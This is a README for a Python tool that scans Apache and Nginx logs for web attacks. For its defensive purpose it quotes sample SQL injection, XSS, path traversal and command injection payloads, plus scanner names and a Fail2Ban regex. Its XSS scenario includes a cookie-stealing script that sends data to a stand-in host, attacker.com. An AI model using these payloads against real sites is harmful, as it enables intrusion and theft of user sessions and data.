# Web Server Log Analyzer

A comprehensive web server log analyzer that detects SQL injection, XSS, directory traversal, command injection, brute force attacks, and bot activity in Apache/Nginx logs. Essential for healthcare web applications and critical infrastructure protection.

## 🎯 Perfect For

- **Healthcare Web Applications** - Protect patient portals and EHR systems
- **E-commerce Security** - Detect payment card attacks (PCI-DSS)
- **Critical Infrastructure** - Monitor SCADA web interfaces
- **Compliance Auditing** - Generate attack reports for SOC 2, ISO 27001
- **Incident Response** - Identify attack patterns and threat actors
- **SOC Operations** - Automated threat detection

## ✨ Features

- ✅ **SQL Injection Detection** - Comprehensive SQLi pattern matching
- ✅ **XSS Attack Detection** - Identify cross-site scripting attempts
- ✅ **Directory Traversal** - Detect path traversal attacks
- ✅ **Command Injection** - Find OS command injection attempts
- ✅ **Brute Force Detection** - Identify login attack patterns
- ✅ **Bot/Scanner Detection** - Flag security scanner activity
- ✅ **Apache & Nginx Support** - Parse both log formats
- ✅ **JSON Reporting** - Export for SIEM integration
- ✅ **Attack Attribution** - Track IPs across attack types
- ✅ **Zero Dependencies** - Pure Python 3 standard library

## 🚀 Quick Start

### Basic Analysis
```bash
# Analyze Apache access log
python3 web_log_analyzer.py /var/log/apache2/access.log

# Analyze Nginx access log
python3 web_log_analyzer.py /var/log/nginx/access.log
```

### Export Results
```bash
# Generate JSON report for SIEM
python3 web_log_analyzer.py access.log --export attack_report.json
```

## 📊 Sample Output

```
======================================================================
Web Server Log Analyzer - Starting Analysis
======================================================================
Log file: /var/log/apache2/access.log
Started: 2025-10-30 14:30:15
======================================================================

[*] Parsing log file...
[+] Parsed 15,847 log entries
[+] Total attacks detected: 234

[*] Analyzing for brute force attacks...
[+] Found 3 IPs with brute force behavior

======================================================================
Security Analysis Report
======================================================================

📊 SUMMARY
──────────────────────────────────────────────────────────────────────
Total log entries: 15,847
Total attacks detected: 234
Unique attack types: 5

🚨 ATTACK TYPES DETECTED
──────────────────────────────────────────────────────────────────────
  SQL Injection: 87 attempt(s)
  Cross-Site Scripting (XSS): 52 attempt(s)
  Directory Traversal: 34 attempt(s)
  Security Scanner/Bot: 48 attempt(s)
  Brute Force Login: 3 attempt(s)

🔍 DETAILED ATTACK INFORMATION
──────────────────────────────────────────────────────────────────────

💉 SQL Injection Attempts (87)
──────────────────────────────────────────────────────────────────────
Top attacking IPs:
  203.0.113.45: 42 attempts
  198.51.100.23: 28 attempts
  192.0.2.15: 17 attempts

Recent attempts:
  [30/Oct/2025:14:25:33] 203.0.113.45
    Path: /search.php?q=1' OR '1'='1
    Status: 200

  [30/Oct/2025:14:26:15] 203.0.113.45
    Path: /login.php?user=admin'--
    Status: 403

🎯 Cross-Site Scripting (XSS) Attempts (52)
──────────────────────────────────────────────────────────────────────
Top attacking IPs:
  198.51.100.67: 31 attempts
  203.0.113.89: 21 attempts

Recent attempts:
  [30/Oct/2025:14:30:45] 198.51.100.67
    Path: /comment.php?text=<script>alert(document.cookie)</script>
    Status: 200

🔐 Brute Force Login Attempts (3)
──────────────────────────────────────────────────────────────────────
  IP: 192.0.2.100
    Total attempts: 47
    Failed attempts: 45
    Targeted endpoints: /wp-login.php, /admin

🎯 TOP ATTACKING IPs
──────────────────────────────────────────────────────────────────────
  203.0.113.45: 68 total attacks
  198.51.100.67: 52 total attacks
  192.0.2.100: 47 total attacks

🔒 SECURITY RECOMMENDATIONS
──────────────────────────────────────────────────────────────────────
• CRITICAL: Implement parameterized queries to prevent SQL injection
• Use a Web Application Firewall (WAF) to filter SQL injection attempts
• HIGH: Implement output encoding to prevent XSS attacks
• Deploy Content Security Policy (CSP) headers
• MEDIUM: Implement rate limiting on authentication endpoints
• Deploy CAPTCHA on login forms
• Enable account lockout after failed attempts
• Consider implementing IP-based rate limiting
• Monitor and block repeat offender IPs
```

## 🔍 Attack Types Detected

### 1. SQL Injection
**Patterns Detected:**
- Classic SQLi: `' OR '1'='1`
- Comment-based: `admin'--`
- UNION attacks: `UNION SELECT`
- Boolean attacks: `1=1`
- Stacked queries: `; DROP TABLE`
- Blind SQLi indicators

**Example Logs:**
```
192.168.1.100 - - [30/Oct/2025:14:23:45] "GET /products.php?id=1' OR '1'='1 HTTP/1.1" 200
198.51.100.23 - - [30/Oct/2025:14:24:12] "POST /login.php?user=admin'-- HTTP/1.1" 403
```

### 2. Cross-Site Scripting (XSS)
**Patterns Detected:**
- Script injection: `<script>alert(1)</script>`
- Event handlers: `onerror=`, `onload=`
- JavaScript protocol: `javascript:`
- Cookie theft: `document.cookie`
- DOM manipulation: `document.write`

**Example Logs:**
```
203.0.113.45 - - [30/Oct/2025:14:25:30] "GET /search?q=<script>alert('XSS')</script> HTTP/1.1" 200
```

### 3. Directory Traversal
**Patterns Detected:**
- Path traversal: `../../../etc/passwd`
- Windows paths: `..\..\windows\system32`
- URL encoded: `%2e%2e/`
- Target files: `/etc/shadow`, `boot.ini`

**Example Logs:**
```
192.0.2.15 - - [30/Oct/2025:14:27:11] "GET /download.php?file=../../../etc/passwd HTTP/1.1" 404
```

### 4. Command Injection
**Patterns Detected:**
- Shell commands: `; ls -la`
- Piped commands: `| cat /etc/passwd`
- Command substitution: `$(whoami)`
- Backtick execution: `` `id` ``

**Example Logs:**
```
198.51.100.89 - - [30/Oct/2025:14:28:45] "GET /ping.php?host=google.com;ls HTTP/1.1" 500
```

### 5. Brute Force Login Attacks
**Detection:**
- Multiple failed auth attempts (>5) from same IP
- Rapid authentication requests
- Common endpoint targets: `/login`, `/wp-admin`, `/admin`

**Example Pattern:**
```
192.0.2.100 - Failed login attempts: 47
  Endpoints: /wp-login.php (32), /admin (15)
```

### 6. Security Scanner Detection
**Detected Tools:**
- SQLMap, Nikto, Nmap, Acunetix
- Burp Suite, w3af, Metasploit
- WPScan, DirBuster, OpenVAS

**Example User-Agents:**
```
"Mozilla/5.0 (compatible; Nikto/2.1.5)"
"sqlmap/1.4.7#stable"
```

## 💡 Usage Examples

### Healthcare Web Applications
```bash
# Analyze patient portal logs
python3 web_log_analyzer.py /var/log/apache2/patient-portal-access.log

# Daily security report for HIPAA compliance
python3 web_log_analyzer.py /var/log/apache2/access.log \
    --export /var/reports/security_$(date +%Y%m%d).json

# Check EHR system access
python3 web_log_analyzer.py /var/log/nginx/ehr-access.log
```

### E-commerce / PCI-DSS Compliance
```bash
# Monitor payment page attacks
python3 web_log_analyzer.py /var/log/apache2/checkout-access.log

# Weekly PCI-DSS report
python3 web_log_analyzer.py /var/log/nginx/access.log \
    --export pci_report_$(date +%Y%m%d).json
```

### Critical Infrastructure
```bash
# SCADA web interface monitoring
python3 web_log_analyzer.py /var/log/nginx/scada-web-access.log

# ICS/OT web portal security
python3 web_log_analyzer.py /var/log/apache2/ics-access.log
```

### Automated Monitoring
```bash
#!/bin/bash
# Hourly log analysis for SOC

LOG_FILE="/var/log/apache2/access.log"
REPORT_DIR="/var/security/reports"
TIMESTAMP=$(date +%Y%m%d_%H%M)

python3 web_log_analyzer.py "$LOG_FILE" \
    --export "${REPORT_DIR}/attacks_${TIMESTAMP}.json"

# Alert on attacks
ATTACK_COUNT=$(grep -o '"total_attacks": [0-9]*' "${REPORT_DIR}/attacks_${TIMESTAMP}.json" | awk '{print $2}')

if [ "$ATTACK_COUNT" -gt 0 ]; then
    echo "SECURITY ALERT: $ATTACK_COUNT attacks detected" | \
        mail -s "Web Attack Alert" soc@company.com
fi
```

## 🚨 Real-World Attack Scenarios

### Scenario 1: Healthcare Data Breach Attempt
```
[*] Attacker IP: 203.0.113.45
[*] Target: patient-portal.hospital.com
[*] Attack Vector: SQL Injection

Timeline:
14:23:15 - Initial probe: /search.php?q=test
14:23:45 - SQLi attempt: /search.php?q=1' OR '1'='1
14:24:12 - Auth bypass: /login.php?user=admin'--
14:24:45 - Data exfil: /records.php?id=1 UNION SELECT * FROM patients

Recommendation: Block IP immediately, patch SQLi vulnerability, 
               review access logs for data exposure
```

### Scenario 2: E-commerce XSS Attack
```
[*] Attacker IP: 198.51.100.67
[*] Target: checkout.example.com
[*] Attack Vector: Stored XSS

Timeline:
15:10:23 - Test payload: /comment?text=<script>alert(1)</script>
15:11:45 - Cookie theft: /comment?text=<script>document.location='attacker.com/steal?c='+document.cookie</script>
15:12:30 - Persistent XSS: Successfully stored in database

Recommendation: Implement output encoding, deploy CSP headers,
               sanitize all user inputs
```

### Scenario 3: Infrastructure Reconnaissance
```
[*] Scanner IP: 192.0.2.15
[*] Target: control-system.factory.com
[*] Tool: Nikto Web Scanner

Timeline:
16:05:00 - Directory scan: /admin, /config, /backup
16:06:15 - Config file probe: /.git/config, /web.config
16:07:30 - Traversal attempt: /download?file=../../../etc/passwd

Recommendation: Block scanner IP, review access controls,
               remove sensitive files from web root
```

## 📁 File Structure

```
web_log_analyzer.py     - Main analyzer script
attack_report.json      - Example attack report (created with --export)
```

## 🔧 Command-Line Options

```
usage: web_log_analyzer.py [-h] [--export EXPORT] log_file

positional arguments:
  log_file         Path to web server access log

options:
  -h, --help       Show help message
  --export FILE    Export attack report to JSON file
```

## 🎓 Advanced Usage

### Real-Time Monitoring
```bash
# Monitor log in real-time (combine with tail)
tail -f /var/log/apache2/access.log | while read line; do
    echo "$line" | python3 web_log_analyzer.py -
done
```

### Integration with SIEM
```python
#!/usr/bin/env python3
import subprocess
import json
import requests

# Analyze logs
subprocess.run([
    'python3', 'web_log_analyzer.py',
    '/var/log/apache2/access.log',
    '--export', '/tmp/attacks.json'
])

# Load results
with open('/tmp/attacks.json', 'r') as f:
    data = json.load(f)

# Send to SIEM
if data['analysis_info']['total_attacks'] > 0:
    requests.post(
        'https://siem.company.com/api/alerts',
        json=data,
        headers={'Authorization': 'Bearer TOKEN'}
    )
```

### Automated IP Blocking
```bash
#!/bin/bash
# Extract attacking IPs and block with iptables

python3 web_log_analyzer.py /var/log/apache2/access.log --export /tmp/report.json

# Extract top attacking IPs
jq -r '.attacks[][] | .ip' /tmp/report.json | sort -u | while read ip; do
    echo "Blocking $ip"
    sudo iptables -A INPUT -s $ip -j DROP
done

# Save iptables rules
sudo iptables-save > /etc/iptables/rules.v4
```

### Weekly Security Reports
```bash
#!/bin/bash
# Generate weekly security summary

WEEK=$(date +%Y-W%U)
OUTPUT="/var/reports/weekly_${WEEK}.txt"

echo "=== Weekly Web Security Report ===" > "$OUTPUT"
echo "Week: $WEEK" >> "$OUTPUT"
echo "" >> "$OUTPUT"

# Analyze each day's logs
for i in {0..6}; do
    DATE=$(date -d "$i days ago" +%Y%m%d)
    LOG="/var/log/apache2/access.log.${DATE}"
    
    if [ -f "$LOG" ]; then
        echo "Analyzing $DATE..." >> "$OUTPUT"
        python3 web_log_analyzer.py "$LOG" >> "$OUTPUT"
        echo "" >> "$OUTPUT"
    fi
done

# Email report
mail -s "Weekly Security Report - $WEEK" security@company.com < "$OUTPUT"
```

## ⚠️ Important Notes

### Log Format Support
- **Apache Common Log Format** - ✓ Supported
- **Apache Combined Log Format** - ✓ Supported
- **Nginx Access Log Format** - ✓ Supported
- **Custom Log Formats** - May require modification

### Performance
- Processes ~10,000 log entries per second
- Memory usage scales with log file size
- For very large logs (>1GB), consider splitting files

### False Positives
- Some legitimate URLs may trigger alerts
- Tune pattern matching for your application
- Review alerts manually for verification

## 🤝 Integration Examples

### With WAF
```bash
# Analyze logs, extract attack patterns
python3 web_log_analyzer.py access.log --export attacks.json

# Generate WAF rules from detected attacks
python3 generate_waf_rules.py attacks.json > modsecurity_rules.conf

# Apply to ModSecurity
sudo cp modsecurity_rules.conf /etc/modsecurity/
sudo systemctl reload apache2
```

### With Fail2Ban
```bash
# Create Fail2Ban filter for detected attacks
[Definition]
failregex = ^<HOST>.*"GET.*(\%27|\'|union|select|script|alert).*"
ignoreregex =

# Update Fail2Ban jail
[apache-attacks]
enabled = true
filter = apache-attacks
action = iptables-multiport[name=apache-attacks, port="http,https"]
logpath = /var/log/apache2/access.log
maxretry = 3
findtime = 600
```

### With Splunk/ELK
```bash
# Export to JSON and index
python3 web_log_analyzer.py access.log --export attacks.json

# Send to Elasticsearch
curl -X POST "http://elk:9200/web-attacks/_doc" \
    -H 'Content-Type: application/json' \
    -d @attacks.json

# Or to Splunk
curl -X POST "https://splunk:8088/services/collector" \
    -H "Authorization: Splunk YOUR-TOKEN" \
    -d @attacks.json
```

## 📚 References

- OWASP Top 10 (Web Application Security Risks)
- OWASP Testing Guide (Web Application Penetration Testing)
- CIS Controls v8 (Continuous Vulnerability Management)
- PCI-DSS Requirement 10 (Track and Monitor All Access)
- NIST SP 800-92 (Guide to Computer Security Log Management)

## 📄 License

MIT License - Use freely for security monitoring

## 👨‍💻 Author

Created for security operations centers, web application developers, and infrastructure security teams.

---

**Remember**: Regular log analysis is critical for early threat detection. Automate this tool in your security monitoring pipeline.
